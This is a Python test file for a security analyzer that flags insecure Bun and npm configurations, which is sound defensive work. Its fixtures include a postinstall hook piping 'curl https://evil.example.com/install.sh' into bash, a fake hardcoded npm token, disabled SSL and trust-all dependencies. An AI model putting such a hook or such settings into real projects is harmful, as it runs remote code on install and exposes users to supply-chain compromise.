"""Tests for BunAnalyzer."""

import json
from pathlib import Path

from devai.bun_analyzer import BunAnalyzer, BunFinding


INSECURE_BUNFIG = """\
[install]
registry = "http://registry.example.com"
//registry.example.com/:_authToken=npm_hardcoded_token_abcdefghijklmnopqrst
auto = "force"
frozenLockfile = false
trustedDependencies = ["*"]
"""

INSECURE_NPMRC = """\
registry=https://registry.npmjs.org/
strict-ssl=false
"""

INSECURE_PACKAGE_JSON = {
    "name": "demo",
    "packageManager": "bun@1.1.0",
    "scripts": {
        "postinstall": "curl https://evil.example.com/install.sh | bash",
    },
    "dependencies": {
        "lodash": "*",
        "debug": "git+https://github.com/debug-js/debug.git#main",
    },
}

HARDENED_BUNFIG = """\
[install]
registry = "https://registry.npmjs.org/"
frozenLockfile = true
exact = true
"""


class TestBunAnalyzer:
    def test_detects_insecure_bunfig(self, tmp_path: Path):
        (tmp_path / "bunfig.toml").write_text(INSECURE_BUNFIG, encoding="utf-8")
        (tmp_path / "bun.lock").write_text("# bun lockfile\n", encoding="utf-8")
        analyzer = BunAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds or "npm_token" in kinds
        assert "insecure_http" in kinds
        assert "frozen_lockfile_disabled" in kinds
        assert "trust_all_deps" in kinds

    def test_detects_insecure_npmrc(self, tmp_path: Path):
        (tmp_path / "bun.lock").write_text("# bun lockfile\n", encoding="utf-8")
        (tmp_path / ".npmrc").write_text(INSECURE_NPMRC, encoding="utf-8")
        analyzer = BunAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "insecure_ssl" in kinds

    def test_detects_insecure_package_json(self, tmp_path: Path):
        (tmp_path / "package.json").write_text(
            json.dumps(INSECURE_PACKAGE_JSON), encoding="utf-8"
        )
        analyzer = BunAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "curl_pipe_shell" in kinds
        assert "dynamic_version" in kinds
        assert "unpinned_git_dep" in kinds
        assert "missing_lockfile" in kinds

    def test_hardened_config_has_no_findings(self, tmp_path: Path):
        (tmp_path / "bunfig.toml").write_text(HARDENED_BUNFIG, encoding="utf-8")
        (tmp_path / "bun.lock").write_text("# bun lockfile\n", encoding="utf-8")
        analyzer = BunAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        high = [f for f in findings if f.severity == "high"]
        assert len(high) == 0

    def test_health_score(self, tmp_path: Path):
        (tmp_path / "bunfig.toml").write_text(INSECURE_BUNFIG, encoding="utf-8")
        (tmp_path / "bun.lock").write_text("# bun lockfile\n", encoding="utf-8")
        analyzer = BunAnalyzer(str(tmp_path))
        score = analyzer.health_score()
        assert score < 100.0

    def test_summary_and_context(self, tmp_path: Path):
        (tmp_path / "bunfig.toml").write_text(HARDENED_BUNFIG, encoding="utf-8")
        (tmp_path / "bun.lock").write_text("# bun lockfile\n", encoding="utf-8")
        analyzer = BunAnalyzer(str(tmp_path))
        assert "Bun configs:" in analyzer.summary()
        assert "Bun analysis:" in analyzer.to_context()

    def test_generate_hardened_config(self):
        analyzer = BunAnalyzer(".")
        template = analyzer.generate_hardened_config()
        assert "bunfig.toml" in template
        assert "frozenLockfile" in template

    def test_no_configs_returns_empty(self, tmp_path: Path):
        analyzer = BunAnalyzer(str(tmp_path))
        assert analyzer.configs() == []
        assert analyzer.analyze() == []
        assert analyzer.health_score() == 100.0

    def test_finding_format(self):
        finding = BunFinding(
            kind="test",
            severity="high",
            message="test message",
            path="bunfig.toml",
            lineno=1,
            line="test",
        )
        assert "[high]" in finding.format()
        assert "bunfig.toml" in finding.format()
